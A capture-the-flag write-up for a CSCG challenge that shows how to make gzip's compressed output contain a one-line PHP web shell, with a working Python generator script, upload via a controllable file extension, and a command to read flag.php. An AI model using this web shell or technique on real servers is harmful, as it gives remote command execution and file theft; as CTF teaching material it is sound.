The given link brought me to a php website, which takes a URL, downloads the file from the URL, compresses it with gunzip on the highest compression level, stores it on the Server and lets you download it. 
[someimage]
The first thing that came to my mind was if I could maybe use the `php://` URI to let the server compress `flag.php` and send it to me, but at closer inspection of the source code I saw, that only URLs with `http://` or `https://` at the start are allowed:
```php
if (substr( $url, 0, 7 ) !== "http://" && substr( $url, 0, 8 ) !== "https://") {
	die("Invalid url!");
}
```
While this is bad news, I also found a unmentioned additional POST-parameter being used.
```php
$ext = ".txt.gz";

if (isset($_POST["ext"])) {
	if (preg_match("/(\[.a-z0-9\]{3,10})/", $_POST["ext"], $matches) == 1) {
		$ext = $matches[0];
	}
}
```
It looks like you can control the extension of the saved file on the server with the parameter as long as the extension matches the regex.
The php-server and the file upload already looked suspiciously like custom php-code execution on the server, but the addition of this blatantly obvious POST-parameter to control the file extension was a pretty obvious marker that I should take a closer look at the gunzip algorithm, to find a file which compressed gave valid php code I could execute on the server.

Finding the Payload
===

At first glance, this seems impossible, because of one of the core aspects of compression. Most of the compression relies on the repetetive nature of english (or any other modern language) and the elimination of these repetetive patterns. It seems like an impossible task to try to get functional php code as an output, because it is nearly as repetetive as the english language and as that would never be the output of gunzip, because the repetetive parts of it would have been replaced by backpointers to old parts of the original file. In fact, this is very much true for most php code, but at the same time php makes it really easy to execute shell code with backticks(\`) so oneliners like this:
```php
<?=`$_GET[1]`?>
```
are actually possible.
This one just gets the content of the GET-parameter `1`, executes it in a shell and prints the output.
As you can see, this piece of code does not repeat itself anywhere
With that in mind, I started to think about creating the real payload. My first idea was to just decompress the original php oneliner and send the result of it to the server. After trying this, I noticed two problems with my approach. First, Gzip was not able do decompress my file, because it had the wrong format and did not fit the Gzip standard, and second, the server prepends the string `'----------- CREATED WITH GZIP PACKER V0.1 -------------------` to the data, which would completely change the output of the original payload.

My second idea was to just bruteforce the payload by compressing the string from the server + random bytes and hope that the php shell will show up in one of the compressed outputs, but after I tried bruteforcing just the first 4 of the 15 characters with a little python script and it took over 20 minutes I thought about how long it would take for 15 characters and gave up on that idea too.

After some digging into the theory of the deflate algorithm and the format of it, I found out, that it uses a dynamic huffman table for most of the blocks, which means that the algorithm creates a unique bit-code for every character, where the length is based on the frequency of the character in the original data. That means, the more frequently appearing characters in the original data have a short code and the characters less frequently appearing have longer codes so they take more space in the compressed data. 

Luckily that means, that when the data is nearly random, every character is appearing in nearly the same frequency and the codes all have the same length of 8 bits, the normal length of a byte/character in data. 

My idea was to first create a bunch random data with the string from the server in front of it and check if the huffman codes of most of the characters have a length of 8 bits and match valid ascii codes, but after some trying to build a reliable check for this, I noticed it is much easier to just compress a bunch of random bytes and overwrite some of the compressed bytes with my own payload, test the new compressed file by decompressing and compressing it again and then check wether the payload is still in the data or not ( I used `gzip -9 -dc file.gz > file 2> /dev/null` because otherwise `gzip` would not write the output into the file and spam the terminal with errors because the crc32 checksum at the end does not fit the decompressed data):
```py
def createFile(payload):

	with open('file', 'wb') as f:
		out = b'----------- CREATED WITH GZIP PACKER V0.1 -------------------\\n' + b'abcdefg'\*50 + os.urandom(8192)

		out = out.replace(b'<', b'').replace(b'>', b'') # < and > get replaced with &lt and &gt by the server which could change the output of the compression so I cut them out

		f.write(out)

	# zip file
	os.system('gzip -9 -fn file')

	offset = random.randint(300, 600)
	with open('file.gz', 'rb') as f:
		data = f.read()
		data = data[:offset] + payload + data[offset+len(payload):]

	with open('file.gz', 'wb') as f:
		f.write(data)


def checkForWorkingFile(payload):

	os.system('gzip -9 -fdc file.gz > file 2> /dev/null')
	os.system('gzip -9 -fn file')

	# check if oneliner exists in compressed file

	with open('file.gz', 'rb') as f:
		data = f.read()
		if payload in data:
			print('sucess!')
			return True

	return False


def main():

	payload = b'<?=`$_GET[1]`?>'

	while 1:
		createFile(payload)
		if checkForWorkingFile(payload):
			break

	os.system("gzip -9f -d file.gz")

	with open('file', 'rb') as f:
		data = f.read()
	with open('file', 'wb') as f:
		f.write(data[63:]) # cut out the prefix from the server

main()
```
Because it sometimes does not work, I looped the whole process until the check succeeds, which is the case in most tries.
Finally, I just decompressed the file and removed the prefix at the start, because the server will append it itself, uploaded the file to the server, and set the `ext` POST-parameter to `.php` in the request through burp suite. The Server returned a link to `output.php` , which I could request with the GET-parameter  `1` set to a bash command to give me the output of this command.

I used the command `base64 ../../flag.php` to give me the base64 encoded verson of the flag.php file, which I just decoded to get the flag:

`CSCG{I_h0pe_y0u_f0und_th3_sh0rt_tags_(btw_idea_was_from_CVE2020_11060)}`